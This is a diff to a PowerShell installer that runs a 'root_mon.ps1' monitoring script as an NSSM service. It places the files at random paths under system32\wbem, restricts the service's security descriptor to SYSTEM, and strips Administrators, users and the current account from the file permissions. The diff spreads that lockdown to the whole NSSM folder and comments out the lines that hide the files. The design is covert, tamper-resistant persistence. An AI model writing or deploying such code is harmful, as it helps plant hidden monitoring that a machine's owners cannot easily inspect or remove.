@@ -1,6 +1,7 @@
 # script must run as admin/SYSTEM
 param(
-    [string]$rootPath
+    [string]$rootPath,
+    [string]$scriptPath
 )
 
 $paths = @(
@@ -11,9 +12,11 @@ $nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
 $nssmFolder = "$env:windir\system32\wbem\nssm"
 $nssmexe = "$nssmFolder\nssm.exe"
 
-$idx = Get-Random -Minimum 0 -Maximum $paths.Length
-$scriptPath = $paths[$idx]
-$scriptPath = "$scriptPath\root_mon.ps1"
+if(($scriptPath -eq $null) -or ($rootPath -eq "")){
+    $idx = Get-Random -Minimum 0 -Maximum $paths.Length
+    $scriptPath = $paths[$idx]
+    $scriptPath = "$scriptPath\root_mon.ps1"
+}
 
 if(($rootPath -eq $null) -or ($rootPath -eq "")){
     $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
@@ -62,29 +65,29 @@ if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
 $SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
 sc.exe sdset $serviceName $SDDL
 
-takeown /F $nssmexe /A /R /D Y 2>&1 | Out-Null
+takeown /F $nssmFolder /A /R /D Y 2>&1 | Out-Null
 takeown /F $scriptPath /A /R /D Y 2>&1 | Out-Null
 
 #  Set SYSTEM as owner (prevents inheritance)
-icacls $nssmexe /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null
+icacls $nssmFolder /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null
 icacls $scriptPath /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null
 
 # Remove inheritance and grant SYSTEM full control
-icacls $nssmexe /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
-icacls $nssmexe /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
+icacls $nssmFolder /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
+icacls $nssmFolder /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
 icacls $scriptPath /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
 icacls $scriptPath /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
 
 # Remov all other users/groups (optional safety measure)
-icacls $nssmexe /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
-icacls $nssmexe /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null
+icacls $nssmFolder /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
+icacls $nssmFolder /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null
 icacls $scriptPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
 icacls $scriptPath /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null
 
 # 4. Explicitly remove your user account
-icacls $nssmexe /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null
+icacls $nssmFolder /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null
 icacls $scriptPath /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null
 
 
-attrib +h +s +r $nssmFolder
-attrib +h +s +r $scriptPath
+#attrib +h +s +r $nssmFolder
+#attrib +h +s +r $scriptPath
